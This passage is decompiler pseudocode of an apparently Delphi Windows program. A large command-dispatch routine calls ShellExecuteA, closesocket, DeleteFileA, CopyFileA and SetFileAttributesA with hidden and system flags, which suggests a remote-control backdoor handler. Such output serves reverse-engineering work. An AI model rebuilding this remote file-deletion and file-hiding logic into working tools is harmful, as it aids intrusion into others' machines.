var_4cch;\n    uint var_4c8h;\n    uint var_4c4h;\n    int32_t var_4c0h;\n    uint var_4bch;\n    int32_t var_4b8h;\n    uint var_4b4h;\n    uint var_4b0h;\n    uint *var_4ach;\n    uint var_4a8h;\n    int32_t *var_4a4h;\n    uint var_4a0h;\n    int32_t *var_49ch;\n    uint var_498h;\n    int32_t *var_494h;\n    uint *var_490h;\n    int32_t *var_48ch;\n    int32_t *var_488h;\n    int32_t *var_484h;\n    uint var_480h;\n    int32_t *var_47ch;\n    int32_t *var_478h;\n    int32_t *var_474h;\n    int32_t *var_470h;\n    int32_t *var_46ch;\n    uint *var_468h;\n    uint *var_464h;\n    uint *var_460h;\n    uint *var_45ch;\n    uint var_458h;\n    uint *var_454h;\n    uint *var_450h;\n    int32_t *var_44ch;\n    uint *var_448h;\n    int32_t *var_444h;\n    uint *var_440h;\n    int32_t *var_43ch;\n    int32_t *var_438h;\n    uint *var_434h;\n    uint *var_430h;\n    uint *var_42ch;\n    uint *var_428h;\n    uchar *var_424h;\n    int32_t var_420h;\n    int32_t var_41ch;\n    uint *var_418h;\n    uint *var_414h;\n    uint *var_410h;\n    int32_t *var_40ch;\n    uint *var_408h;\n    uint *var_404h;\n    uint *var_400h;\n    uint *var_3fch;\n    uint *var_3f8h;\n    uint *var_3f4h;\n    uint *var_3f0h;\n    uint *var_3ech;\n    uint *var_3e8h;\n    uint *var_3e4h;\n    uint *var_3e0h;\n    uint var_3dch;\n    uint var_3d8h;\n    uint *var_3d4h;\n    uint *var_3d0h;\n    uint *var_3cch;\n    uint *var_3c8h;\n    uint *var_3c4h;\n    uint *var_3c0h;\n    uint *var_3bch;\n    uint var_3b8h;\n    uint var_3b4h;\n    uint *var_3b0h;\n    uint *var_3ach;\n    uint var_3a8h;\n    uint var_3a4h;\n    uint *var_3a0h;\n    uint var_39ch;\n    uint var_398h;\n    uint *var_394h;\n    uint var_390h;\n    uint var_38ch;\n    uint *var_388h;\n    uint *var_384h;\n    uint *var_380h;\n    uint *var_37ch;\n    uint var_378h;\n    uint var_374h;\n    uint var_370h;\n    uint *var_36ch;\n    uint *var_368h;\n    uint *var_364h;\n    uint *var_360h;\n    uint *var_35ch;\n    uint *var_358h;\n    uint *var_354h;\n    uint *var_350h;\n    uint *var_34ch;\n    uint *var_348h;\n    uint *var_344h;\n    uint *var_340h;\n    uint *var_33ch;\n    uint *var_338h;\n    uint *var_334h;\n    uint *var_330h;\n    uint *var_32ch;\n    uint *var_328h;\n    uint *var_324h;\n    uint *var_320h;\n    uint *var_31ch;\n    uint *var_318h;\n    uint *var_314h;\n    uint *var_310h;\n    uint var_30ch;\n    uint *var_308h;\n    uint *var_304h;\n    uint *var_300h;\n    uint *var_2fch;\n    uint *var_2f8h;\n    uint var_2f4h;\n    uint *var_2f0h;\n    uchar *var_2ech;\n    uint *var_2e8h;\n    uint *var_2e4h;\n    uint *var_2e0h;\n    int32_t *var_2dch;\n    uint *var_2d8h;\n    uint *var_2d4h;\n    uint *var_2d0h;\n    uint *var_2cch;\n    uint *var_2c8h;\n    uint *var_2c4h;\n    uint *var_2c0h;\n    uint *var_2bch;\n    uint *var_2b8h;\n    uint var_2b4h;\n    uint var_2b0h;\n    uint *var_2ach;\n    uint var_2a8h;\n    uint var_2a4h;\n    uint *var_2a0h;\n    uint var_29ch;\n    uint *var_298h;\n    uint var_294h;\n    uint *var_290h;\n    uint *var_28ch;\n    uint *var_288h;\n    uint *var_284h;\n    uint *var_280h;\n    uint *var_27ch;\n    uint *var_278h;\n    uint *var_274h;\n    uint *var_270h;\n    uint var_26ch;\n    uint *var_268h;\n    uint *var_264h;\n    uint var_260h;\n    uint var_25ch;\n    int32_t var_258h;\n    uint *var_254h;\n    uint *var_250h;\n    uint *var_24ch;\n    uint var_248h;\n    uchar *var_244h;\n    uint var_240h;\n    int32_t var_23ch;\n    uint var_238h;\n    uint *var_234h;\n    uint var_230h;\n    int32_t *var_22ch;\n    uint var_228h;\n    uint var_224h;\n    uint *var_220h;\n    int32_t var_21ch;\n    uint *var_218h;\n    uint var_214h;\n    uint var_210h;\n    uint *var_20ch;\n    uint lpBuffer;\n    uint var_204h;\n    uint *puStack516;\n    uint uStack512;\n    uint uStack508;\n    uint *puStack504;\n    uint uStack500;\n    uint uStack496;\n    uint *puStack492;\n    uint uStack488;\n    uint32_t uStack484;\n    uint *puStack480;\n    uint32_t uStack476;\n    uint uStack472;\n    int32_t *piStack468;\n    int32_t *piStack464;\n    uint *puStack460;\n    uint uStack456;\n    uint *puStack452;\n    uint *var_1bch;\n    uint *puStack444;\n    uint *puStack440;\n    uint uStack436;\n    uint uStack432;\n    int32_t *var_1a8h;\n    uint var_1a4h;\n    uint uStack420;\n    uint uStack416;\n    uint *var_198h;\n    uint *puStack408;\n    uint uStack404;\n    uint uStack400;\n    uint32_t var_188h;\n    uint uStack392;\n    uint uStack388;\n    uint uStack384;\n    uint *puStack380;\n    uint *puStack376;\n    uchar *arg_8h_03;\n    uint *var_38h;\n    uint *puStack56;\n    int32_t *piStack52;\n    int32_t *piStack48;\n    uint var_28h;\n    uchar *puStack40;\n    int32_t *piStack36;\n    uint *var_1ch;\n    uchar *var_18h;\n    int32_t var_14h;\n    uint *var_10h;\n    int32_t *var_ch;\n    uint *var_8h;\n    uint var_4h;\n    \n    puStack40 = &stack0xfffffffc;\n    arg_8h_03 = &stack0xfffffffc;\n    arg_8h_02 = &stack0xfffffffc;\n    arg_8h_01 = &stack0xfffffffc;\n    arg_8h_00 = &stack0xfffffffc;\n    arg_8h = &stack0xfffffffc;\n    puVar13 = &stack0xfffffffc;\n    puVar12 = &stack0xfffffffc;\n    iVar9 = 0xf5;\n    do {\n        var_4h = 0;\n        iVar9 = iVar9 + -1;\n    } while (iVar9 != 0);\n    var_18h = 0x474fb1;\n    var_14h = unaff_EDI;\n    var_10h = unaff_ESI;\n    var_ch = unaff_EBX;\n    var_8h = in_EAX;\n    fcn.004059cc();\n    var_18h = 0x474fc2;\n    fcn.00405fe8();\n    var_1ch = 0x47c2be;\n    piStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    uVar11 = true;\n    var_28h = 0x47c191;\n    piStack48 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd0;\n    piStack52 = 0x474feb;\n    var_18h = &stack0xfffffffc;\n    fcn.00405974();\n    if (uVar11) {\n        piStack52 = 0x474ff7;\n        fcn.00474d1c();\n    }\n    piStack52 = &fcn.00474f94::var_20ch;\n    puStack56 = 0x475010;\n    fcn.00405a44();\n    puStack56 = 0x475020;\n    fcn.00405974();\n    if (uVar11) {\n        puStack56 = 0x475034;\n        fcn.00405a84();\n        puStack56 = 0x47503c;\n        fcn.00489a74();\n        *in_FS_OFFSET = piStack52;\n        goto code_r0x0047c19b;\n    }\n    puStack56 = &fcn.00474f94::var_210h;\n    var_38h = 0x475062;\n    fcn.00405a44();\n    var_38h = 0x475072;\n    fcn.00405974();\n    if (uVar11) {\n        var_38h = 0x475086;\n        fcn.00405a84();\n        var_38h = 0x47508e;\n        fcn.00409ecc();\n        var_38h = 0x475093;\n        fcn.0048734c();\n    }\n    var_38h = &fcn.00474f94::var_214h;\n    fcn.00405a44();\n    fcn.00405974();\n    if (uVar11) {\n        fcn.00405a84();\n        fcn.00405b28();\n        fcn.00405a44();\n        fcn.00405b28();\n        fcn.00405a84();\n        fcn.004055c8();\n        fcn.00405584();\n        fcn.0048b580();\n        fcn.0040ef34(&fcn.00474f94::var_218h, *0x47c334);\n        fcn.004055c8();\n        cVar1 = fcn.0048b6ec();\n        if (cVar1 == '\\0') {\n            fcn.004055c8();\n        }\n        else {\n            fcn.004055c8();\n        }\n        fcn.0048b5fc();\n        if (var_21ch == 0) {\n            fcn.00405530();\n        }\n        else {\n            fcn.004055c8();\n        }\n        fcn.004609b4();\n        fcn.00409d60();\n        fcn.0048b4f8();\n        fcn.0048b4bc();\n        uVar3 = fcn.0048875c();\n        uVar11 = 1;\n        fcn.00409e4c(uVar3);\n        fcn.0048ba0c();\n        fcn.0048bd4c();\n        fcn.0040a590();\n        fcn.00489f50();\n        fcn.0048b534();\n        fcn.0048c354();\n        fcn.0048c278();\n        fcn.004058e0();\n        fcn.00474d1c();\n    }\n    fcn.00405a44();\n    fcn.00405974();\n    if (uVar11) {\n        fcn.00405a84();\n        fcn.0048b5fc();\n        if (var_258h == 0) {\n            fcn.00405530();\n        }\n        else {\n            fcn.004055c8();\n        }\n        uVar3 = fcn.0048875c();\n        uVar11 = 1;\n        fcn.00409e4c(uVar3);\n        fcn.0048c354();\n        fcn.0048b580();\n        fcn.004058e0();\n        fcn.00474d1c();\n    }\n    fcn.00405a44();\n    fcn.00405974();\n    if (uVar11) {\n        fcn.00405a84();\n        fcn.004059dc();\n        sub.user32.dll_MessageBoxA_1();\n    }\n    fcn.00405a44();\n    fcn.00405974();\n    if (uVar11) {\n        fcn.00405a84();\n        fcn.004059dc();\n        sub.shell32.dll_ShellExecuteA();\n    }\n    fcn.00405974();\n    if (uVar11) {\n        fcn.00467cc0();\n        fcn.00405864();\n        fcn.00474d1c();\n    }\n    fcn.00405974();\n    if (uVar11) {\n        fcn.00467cc0();\n        fcn.00405864();\n        fcn.00474d1c();\n    }\n    fcn.00405974();\n    if (uVar11) {\n        fcn.00487228();\n        fcn.00405864();\n        fcn.00474d1c();\n    }\n    fcn.00405a44();\n    fcn.00405974();\n    if (uVar11) {\n        fcn.00405a84();\n        fcn.00405b28();\n        fcn.00405a44();\n        fcn.00405b28();\n        fcn.00405a84();\n        fcn.00405b28();\n        fcn.00405a44();\n        fcn.00405b28();\n        fcn.00405a84();\n        iVar9 = fcn.00405b28();\n        uVar11 = iVar9 == 1;\n        fcn.00405a44();\n        fcn.00405b28();\n        fcn.00405a84();\n        fcn.004055c8();\n        puStack376 = 0x475697;\n        fcn.0046786c();\n        puStack376 = 0x4756a8;\n        fcn.00474ec8(arg_8h_03);\n    }\n    fcn.00405974();\n    if (uVar11) {\n        uVar11 = 1;\n        fcn.00489414();\n        fcn.00405864();\n        fcn.00474d1c();\n    }\n    fcn.00405974();\n    if (uVar11) {\n        fcn.00489414();\n        fcn.00405864();\n        fcn.00474d1c();\n    }\n    fcn.00405974();\n    if (uVar11) {\n        sub.kernel32.dll_GetCurrentProcessId();\n        fcn.00483944();\n    }\n    fcn.00405974();\n    if (uVar11) {\n        puStack376 = 0x47575b;\n        sub.wsock32.dll_closesocket();\n    }\n    fcn.00405974();\n    if (uVar11) {\n        fcn.0046d960();\n        fcn.00405974();\n        if (uVar11) {\n            puStack376 = **0x492338;\n            puStack380 = 0x47c568;\n            uStack384 = 0x4757eb;\n            fcn.004058e0();\n            uStack384 = 0x4757f6;\n            fcn.004677d8();\n        }\n        else {\n            uVar11 = 1;\n            puStack376 = 0x4757a2;\n            fcn.0040f224();\n            puStack376 = var_2ach;\n            puStack380 = 0x47c568;\n            uStack384 = 0x4757bd;\n            fcn.004058e0();\n            uStack384 = 0x4757c8;\n            fcn.004677d8();\n        }\n        uStack384 = 0x4757fb;\n        sub.kernel32.dll_GetCurrentProcessId();\n        uStack384 = 0x475800;\n        fcn.00483944();\n    }\n    puStack376 = 0x475819;\n    fcn.00405a44();\n    puStack376 = 0x475829;\n    fcn.00405974();\n    if (uVar11) {\n        puStack376 = 0x47583d;\n        fcn.00405a84();\n        puStack376 = 0x475849;\n        cVar1 = fcn.00488860();\n        uVar11 = cVar1 == '\\0';\n        if (uVar11) {\n            puStack376 = 0x475857;\n            fcn.00474d1c();\n        }\n    }\n    puStack376 = &fcn.00474f94::var_2b8h;\n    puStack380 = 0x475870;\n    fcn.00405a44();\n    puStack380 = 0x475880;\n    fcn.00405974();\n    if (uVar11) {\n        puStack380 = 0x475898;\n        fcn.00405a84();\n        puStack380 = &fcn.00474f94::var_ch;\n        uStack384 = 0x4758a9;\n        fcn.00405b28();\n        uStack384 = 0x4758b9;\n        fcn.00405a44();\n        uStack384 = 0x4758c6;\n        fcn.00405b28();\n        uStack384 = 0x4758d5;\n        fcn.00405a84();\n        uStack384 = 0x4758e0;\n        fcn.004055c8();\n        uStack384 = 0x4758ee;\n        fcn.00409b6c();\n        if (var_2bch == NULL) {\n            uStack384 = 5;\n            uStack388 = 0x475952;\n            fcn.0040a590();\n            uStack388 = 0x47595d;\n            uStack388 = fcn.004059dc();\n            uStack392 = 0;\n            var_188h = 0x475968;\n            var_188h = fcn.004059dc();\n            uStack400 = 0x47c418;\n            uStack404 = 0;\n            puStack408 = 0x475975;\n            uVar4 = sub.shell32.dll_ShellExecuteA();\n            uVar11 = uVar4 == 0x20;\n            if (uVar4 < 0x21) {\n                puStack408 = 0x475984;\n                fcn.00474d1c();\n            }\n        }\n        else {\n            uStack384 = 5;\n            uStack388 = 0x475907;\n            fcn.0040a590();\n            uStack388 = 0x475912;\n            uStack388 = fcn.004059dc();\n            uStack392 = 0x47591b;\n            uStack392 = fcn.004059dc();\n            var_188h = 0x475924;\n            var_188h = fcn.004059dc();\n            uStack400 = 0x47c418;\n            uStack404 = 0;\n            puStack408 = 0x475931;\n            uVar4 = sub.shell32.dll_ShellExecuteA();\n            uVar11 = uVar4 == 0x20;\n            if (uVar4 < 0x21) {\n                puStack408 = 0x475940;\n                fcn.00474d1c();\n            }\n        }\n    }\n    puStack408 = &fcn.00474f94::var_2c8h;\n    var_198h = 0x47599d;\n    fcn.00405a44();\n    var_198h = 0x4759ad;\n    fcn.00405974();\n    if (uVar11) {\n        var_198h = 0x4759c5;\n        fcn.00405a84();\n        var_198h = &fcn.00474f94::var_ch;\n        uStack416 = 0x4759d6;\n        fcn.00405b28();\n        uStack416 = 0x4759e6;\n        fcn.00405a44();\n        uStack416 = 0x4759f3;\n        fcn.00405b28();\n        uStack416 = 0x475a02;\n        fcn.00405a84();\n        uStack416 = 0x475a0d;\n        fcn.004055c8();\n        uStack416 = 0x475a1b;\n        fcn.00409b6c();\n        if (var_2cch == NULL) {\n            uStack416 = 0;\n            uStack420 = 0x475a7f;\n            fcn.0040a590();\n            uStack420 = 0x475a8a;\n            uStack420 = fcn.004059dc();\n            var_1a4h = 0;\n            var_1a8h = 0x475a95;\n            var_1a8h = fcn.004059dc();\n            uStack432 = 0x47c418;\n            uStack436 = 0;\n            puStack440 = 0x475aa2;\n            uVar4 = sub.shell32.dll_ShellExecuteA();\n            uVar11 = uVar4 == 0x20;\n            if (uVar4 < 0x21) {\n                puStack440 = 0x475ab1;\n                fcn.00474d1c();\n            }\n        }\n        else {\n            uStack416 = 0;\n            uStack420 = 0x475a34;\n            fcn.0040a590();\n            uStack420 = 0x475a3f;\n            uStack420 = fcn.004059dc();\n            var_1a4h = 0x475a48;\n            var_1a4h = fcn.004059dc();\n            var_1a8h = 0x475a51;\n            var_1a8h = fcn.004059dc();\n            uStack432 = 0x47c418;\n            uStack436 = 0;\n            puStack440 = 0x475a5e;\n            uVar4 = sub.shell32.dll_ShellExecuteA();\n            uVar11 = uVar4 == 0x20;\n            if (uVar4 < 0x21) {\n                puStack440 = 0x475a6d;\n                fcn.00474d1c();\n            }\n        }\n    }\n    puStack440 = &fcn.00474f94::var_2d8h;\n    puStack444 = 0x475aca;\n    fcn.00405a44();\n    puStack444 = 0x475ada;\n    fcn.00405974();\n    if (uVar11) {\n        puStack444 = 0x475aee;\n        fcn.00405a84();\n        puStack444 = &fcn.00474f94::var_ch;\n        var_1bch = 0x475aff;\n        iVar9 = fcn.00405b28();\n        uVar11 = iVar9 == 1;\n        var_1bch = 0x475b0f;\n        fcn.00405a44();\n        var_1bch = 0x475b1c;\n        fcn.00405b28();\n        var_1bch = 0x475b2b;\n        fcn.00405a84();\n        var_1bch = 0x475b33;\n        fcn.00409ecc();\n        var_1bch = 0x475b3d;\n        fcn.00488908();\n    }\n    var_1bch = &fcn.00474f94::var_2dch;\n    puStack452 = 0x475b56;\n    fcn.00405a44();\n    puStack452 = 0x475b66;\n    fcn.00405974();\n    if (uVar11) {\n        puStack452 = 0x475b7e;\n        fcn.00405a84();\n        puStack452 = &fcn.00474f94::var_ch;\n        uStack456 = 0x475b8f;\n        fcn.00405b28();\n        uStack456 = 0x475b9f;\n        fcn.00405a44();\n        uStack456 = 0x475bac;\n        fcn.00405b28();\n        uStack456 = 0x475bbb;\n        fcn.00405a84();\n        uStack456 = 0x475bc3;\n        iVar9 = fcn.00409ecc();\n        uVar11 = iVar9 == 1;\n        if (iVar9 < 2) {\n            uStack456 = 0x475c4c;\n            uStack456 = fcn.004059dc();\n            puStack460 = 0x475c52;\n            sub.kernel32.dll_DeleteFileA();\n        }\n        else {\n            uStack456 = 0x475bce;\n            iVar9 = fcn.00409ecc();\n            uVar11 = iVar9 == 0;\n            if (-1 < iVar9) {\n                iVar9 = iVar9 + 1;\n                iVar10 = 0;\n                do {\n                    puStack460 = 0x475bdf;\n                    iVar5 = fcn.00409ecc();\n                    if (iVar10 == iVar5) {\n                        puStack460 = 0x475beb;\n                        uStack456 = fcn.004059dc();\n                        piStack464 = 0x475bf1;\n                        sub.kernel32.dll_DeleteFileA();\n                    }\n                    else {\n                        puStack460 = &fcn.00474f94::var_10h;\n                        piStack464 = 0x475c04;\n                        fcn.00405b28();\n                        piStack464 = 0x475c14;\n                        fcn.00405a44();\n                        piStack464 = 0x475c21;\n                        fcn.00405b28();\n                        piStack464 = 0x475c30;\n                        fcn.00405a84();\n                        piStack464 = 0x475c38;\n                        uStack456 = fcn.004059dc();\n                        piStack468 = 0x475c3e;\n                        sub.kernel32.dll_DeleteFileA();\n                    }\n                    iVar10 = iVar10 + 1;\n                    iVar9 = iVar9 + -1;\n                    uVar11 = iVar9 == 0;\n                } while (!uVar11);\n            }\n        }\n    }\n    puStack460 = &fcn.00474f94::var_2e0h;\n    piStack464 = 0x475c6b;\n    fcn.00405a44();\n    piStack464 = 0x475c7b;\n    fcn.00405974();\n    if (uVar11) {\n        piStack464 = 0x475c93;\n        fcn.00405a84();\n        piStack464 = &fcn.00474f94::var_ch;\n        piStack468 = 0x475ca4;\n        fcn.00405b28();\n        piStack468 = 0x475cb4;\n        fcn.00405a44();\n        piStack468 = 0x475cc1;\n        fcn.00405b28();\n        piStack468 = 0x475cd0;\n        fcn.00405a84();\n        piStack468 = 0x475cd8;\n        iVar9 = fcn.00409ecc();\n        uVar11 = iVar9 == 1;\n        if (iVar9 < 2) {\n            piStack468 = 0x475d55;\n            fcn.00488a10();\n        }\n        else {\n            piStack468 = 0x475ce3;\n            iVar9 = fcn.00409ecc();\n            uVar11 = iVar9 == 0;\n            if (-1 < iVar9) {\n                iVar9 = iVar9 + 1;\n                iVar10 = 0;\n                do {\n                    piStack468 = 0x475cf4;\n                    iVar5 = fcn.00409ecc();\n                    if (iVar10 == iVar5) {\n                        piStack468 = 0x475d00;\n                        fcn.00488a10();\n                    }\n                    else {\n                        piStack464 = &fcn.00474f94::var_10h;\n                        uStack472 = 0x475d13;\n                        fcn.00405b28();\n                        uStack472 = 0x475d23;\n                        fcn.00405a44();\n                        uStack472 = 0x475d30;\n                        fcn.00405b28();\n                        uStack472 = 0x475d3f;\n                        fcn.00405a84();\n                        uStack472 = 0x475d47;\n                        fcn.00488a10();\n                    }\n                    iVar10 = iVar10 + 1;\n                    iVar9 = iVar9 + -1;\n                    uVar11 = iVar9 == 0;\n                } while (!uVar11);\n            }\n        }\n    }\n    piStack468 = 0x475d62;\n    fcn.00405974();\n    if (uVar11) {\n        piStack468 = 0x475d69;\n        fcn.00488ab4();\n    }\n    piStack468 = &fcn.00474f94::var_2e4h;\n    uStack472 = 0x475d82;\n    fcn.00405a44();\n    uStack472 = 0x475d92;\n    fcn.00405974();\n    if (uVar11) {\n        uStack472 = 0x475da6;\n        fcn.00405a84();\n        uStack472 = 0x80;\n        uStack476 = 0x475db3;\n        uStack476 = fcn.004059dc();\n        puStack480 = 0x475db9;\n        sub.kernel32.dll_SetFileAttributesA();\n    }\n    puStack480 = &fcn.00474f94::var_2e8h;\n    uStack484 = 0x475dd2;\n    fcn.00405a44();\n    uStack484 = 0x475de2;\n    fcn.00405974();\n    if (uVar11) {\n        uStack484 = 0x475df6;\n        fcn.00405a84();\n        uStack484 = 2;\n        uStack488 = 0x475e00;\n        uStack488 = fcn.004059dc();\n        puStack492 = 0x475e06;\n        sub.kernel32.dll_SetFileAttributesA();\n    }\n    puStack492 = &fcn.00474f94::var_2ech;\n    uStack496 = 0x475e1f;\n    fcn.00405a44();\n    uStack496 = 0x475e2f;\n    fcn.00405974();\n    if (uVar11) {\n        uStack496 = 0x475e43;\n        fcn.00405a84();\n        uStack496 = 1;\n        uStack500 = 0x475e4d;\n        uStack500 = fcn.004059dc();\n        puStack504 = 0x475e53;\n        sub.kernel32.dll_SetFileAttributesA();\n    }\n    puStack504 = &fcn.00474f94::var_2f0h;\n    uStack508 = 0x475e6c;\n    fcn.00405a44();\n    uStack508 = 0x475e7c;\n    fcn.00405974();\n    if (uVar11) {\n        uStack508 = 0x475e90;\n        fcn.00405a84();\n        uStack508 = 4;\n        uStack512 = 0x475e9a;\n        uStack512 = fcn.004059dc();\n        puStack516 = 0x475ea0;\n        sub.kernel32.dll_SetFileAttributesA();\n    }\n    puStack516 = &fcn.00474f94::var_2f4h;\n    var_204h = 0x475eb9;\n    fcn.00405a44();\n    var_204h = 0x475ec9;\n    fcn.00405974();\n    if (uVar11) {\n        var_204h = 0x475edd;\n        fcn.00405a84();\n        var_204h = 0x20;\n        lpBuffer = 0x475ee7;\n        lpBuffer = fcn.004059dc();\n        var_20ch = 0x475eed;\n        sub.kernel32.dll_SetFileAttributesA();\n    }\n    var_20ch = &fcn.00474f94::var_2f8h;\n    var_210h = 0x475f06;\n    fcn.00405a44();\n    var_210h = 0x475f16;\n    fcn.00405974();\n    if (uVar11) {\n        var_210h = 0x475f2a;\n        fcn.00405a84();\n        var_210h = 0x100;\n        var_214h = 0x475f37;\n        var_214h = fcn.004059dc();\n        var_218h = 0x475f3d;\n        sub.kernel32.dll_SetFileAttributesA();\n    }\n    var_218h = &fcn.00474f94::var_2fch;\n    var_21ch = 0x475f56;\n    fcn.00405a44();\n    var_21ch = 0x475f66;\n    fcn.00405974();\n    if (uVar11) {\n        var_21ch = 0x475f7e;\n        fcn.00405a84();\n        var_21ch = 0x475f91;\n        fcn.0040a478();\n        uVar4 = var_188h;\n        if ((var_188h & 2) == 0) {\n            var_21ch = 0x475fbb;\n            fcn.004055c8();\n        }\n        else {\n            var_21ch = 0x475fac;\n            fcn.004055c8();\n        }\n        if ((uVar4 & 1) == 0) {\n            var_21ch = 0x475fdf;\n            fcn.004055c8();\n        }\n        else {\n            var_21ch = 0x475fd0;\n            fcn.004055c8();\n        }\n        if ((uVar4 & 0x20) == 0) {\n            var_21ch = 0x476003;\n            fcn.004055c8();\n        }\n        else {\n            var_21ch = 0x475ff4;\n            fcn.004055c8();\n        }\n        uVar11 = (uVar4 & 4) == 0;\n        if (uVar11) {\n            var_21ch = 0x476027;\n            fcn.004055c8();\n        }\n        else {\n            var_21ch = 0x476018;\n            fcn.004055c8();\n        }\n        var_21ch = 0x47c738;\n        var_220h = var_8h;\n        var_224h = 0x47c750;\n        var_228h = 0x47c75c;\n        var_22ch = var_ch;\n        var_230h = 0x47c778;\n        var_234h = var_10h;\n        var_238h = 0x47c778;\n        var_23ch = var_14h;\n        var_240h = 0x47c778;\n        var_244h = var_18h;\n        var_248h = 0x47c784;\n        var_24ch = 0x476069;\n        fcn.004058e0();\n        var_24ch = 0x476074;\n        fcn.00474d1c();\n    }\n    var_24ch = &fcn.00474f94::var_304h;\n    var_250h = 0x47608d;\n    fcn.00405a44();\n    var_250h = 0x47609d;\n    fcn.00405974();\n    if (uVar11) {\n        var_250h = 0x4760b5;\n        fcn.00405a84();\n        uVar11 = **0x4923f8 == 0;\n        if (!uVar11) {\n            var_250h = &fcn.00474f94::var_ch;\n            var_254h = 0x4760d9;\n            fcn.00405b28();\n            var_254h = 0x4760ed;\n            fcn.00405a44();\n            var_254h = 0x4760ff;\n            fcn.00405b28();\n            var_254h = 0x476110;\n            fcn.00405a84();\n            var_254h = &fcn.00474f94::var_308h;\n            var_258h = 0x476129;\n            iVar9 = fcn.00405b28();\n            uVar11 = iVar9 == 1;\n            var_258h = 0x47613d;\n            fcn.00405a44();\n            var_258h = 0x476148;\n            iVar9 = fcn.00409ecc();\n            var_258h = 0x47615c;\n            fcn.00405b28();\n            var_258h = 0x47616d;\n            fcn.00405a84();\n            var_258h = 0x47617d;\n            fcn.004055c8();\n            var_258h = 0x47618a;\n            fcn.00405974();\n            if (uVar11) {\n                uVar11 = iVar9 == 1;\n                if (iVar9 < 2) {\n                    var_258h = -1;\n                    var_25ch = 0x476310;\n                    fcn.0040a67c();\n                    var_25ch = 0x476324;\n                    fcn.00405864();\n                    var_25ch = 0x47632f;\n                    var_25ch = fcn.004059dc();\n                    var_260h = 0x476338;\n                    var_260h = fcn.004059dc();\n                    var_264h = 0x47633e;\n                    sub.kernel32.dll_CopyFileA();\n                    var_264h = 0x476346;\n                    var_264h = fcn.004059dc();\n                    var_268h = 0x47634c;\n                    sub.kernel32.dll_DeleteFileA();\n                }\n                else {\n                    uVar11 = iVar9 == 0;\n                    if (0 < iVar9) {\n                        iVar5 = 1;\n                        iVar10 = iVar9;\n                        do {\n                            if (iVar9 == iVar5) {\n                                var_264h = 0xffffffff;\n                                var_268h = 0x4762b7;\n                                fcn.0040a67c();\n                                var_268h = 0x4762cb;\n                                fcn.00405864();\n                                var_268h = 0x4762d6;\n                                var_268h = fcn.004059dc();\n                                var_26ch = 0x4762df;\n                                var_26ch = fcn.004059dc();\n                                var_270h = 0x4762e5;\n                                sub.kernel32.dll_CopyFileA();\n                                var_270h = 0x4762ed;\n                                var_260h = fcn.004059dc();\n                                var_274h = 0x4762f3;\n                                sub.kernel32.dll_DeleteFileA();\n                            }\n                            else {\n                                var_264h = 0xffffffff;\n                                var_268h = &fcn.00474f94::var_314h;\n                                var_26ch = 0x4761c6;\n                                fcn.00405b28();\n                                var_26ch = 0x4761d6;\n                                fcn.00405a44();\n                                var_26ch = 0x4761e7;\n                                fcn.0040a67c();\n                                var_26ch = 0x4761fb;\n                                fcn.00405864();\n                                var_26ch = 0x476206;\n                                var_26ch = fcn.004059dc();\n                                var_270h = &fcn.00474f94::var_318h;\n                                var_274h = 0x47621b;\n                                fcn.00405b28();\n                                var_274h = 0x47622b;\n                                fcn.00405a44();\n                                var_274h = 0x476236;\n                                var_274h = fcn.004059dc();\n                                var_278h = 0x47623c;\n                                sub.kernel32.dll_CopyFileA();\n                                var_278h = &fcn.00474f94::var_31ch;\n                                var_27ch = 0x476250;\n                                fcn.00405b28();\n                                var_27ch = 0x476260;\n                                fcn.00405a44();\n                                var_1bch = var_31ch;\n                                var_27ch = 0x476277;\n                                var_260h = fcn.004059dc();\n                                var_280h = 0x47627d;\n                                iVar6 = sub.kernel32.dll_DeleteFileA();\n                                puStack452 = puStack452 & 0xffffff | 1 - (iVar6 == 0) << 0x18;\n                                var_280h = 0x476296;\n                                fcn.00405b28();\n                                var_280h = 0x4762a5;\n                                fcn.00405a84();\n                            }\n                            iVar5 = iVar5 + 1;\n                            iVar10 = iVar10 + -1;\n                            uVar11 = iVar10 == 0;\n                        } while (!uVar11);\n                    }\n                }\n            }\n            else {\n                uVar11 = iVar9 == 1;\n                if (iVar9 < 2) {\n                    var_258h = -1;\n                    var_25ch = 0x476473;\n                    fcn.0040a67c();\n                    var_25ch = 0x476487;\n                    fcn.00405864();\n                    var_25ch = 0x476492;\n                    var_25ch = fcn.004059dc();\n                    var_260h = 0x47649b;\n                    var_260h = fcn.004059dc();\n                    var_264h = 0x4764a1;\n                    sub.kernel32.dll_CopyFileA();\n                }\n                else {\n                    uVar11 = iVar9 == 0;\n                    if (0 < iVar9) {\n                        iVar5 = 1;\n                        iVar10 = iVar9;\n                        do {\n                            if (iVar9 == iVar5) {\n                                var_264h = 0xffffffff;\n                                var_268h = 0x47642b;\n                                fcn.0040a67c();\n                                var_268h = 0x47643f;\n                                fcn.00405864();\n                                var_268h = 0x47644a;\n                                var_268h = fcn.004059dc();\n                                var_26ch = 0x476453;\n                                var_260h = fcn.004059dc();\n                                var_270h = 0x476459;\n                                sub.kernel32.dll_CopyFileA();\n                            }\n                            else {\n                                var_264h = 0xffffffff;\n                                var_268h = &fcn.00474f94::var_338h;\n                                var_26ch = 0x476387;\n                                fcn.00405b28();\n                                var_26ch = 0x476397;\n                                fcn.00405a44();\n                                var_26ch = 0x4763a8;\n                                fcn.0040a67c();\n                                var_26ch = 0x4763bc;\n                                fcn.00405864();\n                                var_26ch = 0x4763c7;\n                                var_26ch = fcn.004059dc();\n                                var_270h = &fcn.00474f94::var_33ch;\n                                var_274h = 0x4763dc;\n                                fcn.00405b28();\n                                var_274h = 0x4763ec;\n                                fcn.00405a44();\n                                var_274h = 0x4763f7;\n                                var_260h = fcn.004059dc();\n                                var_278h = 0x4763fd;\n                                sub.kernel32.dll_CopyFileA();\n                                var_278h = 0x47640a;\n                                fcn.00405b28();\n                                var_278h = 0x476419;\n                                fcn.00405a84();\n                            }\n                            iVar5 = iVar5 + 1;\n                            iVar10 = iVar10 + -1;\n                            uVar11 = iVar10 == 0;\n                        } while (!uVar11);\n                    }\n                }\n            }\n            var_264h = 0x4764ab;\n            fcn.00405530();\n            var_264h = 0x4764b5;\n            fcn.00474d1c();\n        }\n    }\n    var_264h = &fcn.00474f94::var_350h;\n    var_268h = 0x4764ce;\n    fcn.00405a44();\n    var_268h = 0x4764de;\n    fcn.00405974();\n    if (uVar11) {\n        var_268h = 0x4764f2;\n        fcn.00405a84();\n        var_268h = 0x4764ff;\n        fcn.00405584();\n    }\n    